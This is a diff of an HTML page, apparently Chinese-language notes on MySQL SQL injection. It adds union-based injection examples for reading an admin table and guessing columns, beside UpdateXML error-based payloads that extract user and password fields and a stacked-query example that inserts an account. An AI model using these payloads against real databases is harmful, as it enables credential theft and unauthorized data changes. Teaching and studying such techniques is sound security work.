@@ -1324,8 +1324,15 @@ mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</s
 //a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
 //对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
 </code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
-<h2 id="联合查询注入">联合查询注入</h2><p>后面再补</p>
-<h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
+<h2 id="联合查询注入">联合查询注入</h2><p>绕过了union和select基本就可以干所有的事情了<br>1.最基本的查询其他内容    </p>
+<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin2 <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> username <span class="keyword">from</span> admin;
+</code></pre><p>2.猜解字段数：</p>
+<pre><code>mysql&gt; select <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
+<span class="comment">//知道返回正常就说明有几个字段</span>
+</code></pre><p>3.猜解字段</p>
+<pre><code>mysql&gt; select <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
+<span class="comment">//猜解username字段是否存在</span>
+</code></pre><h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
 <pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
 mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
 <span class="comment">//可以同时执行多个语句</span>
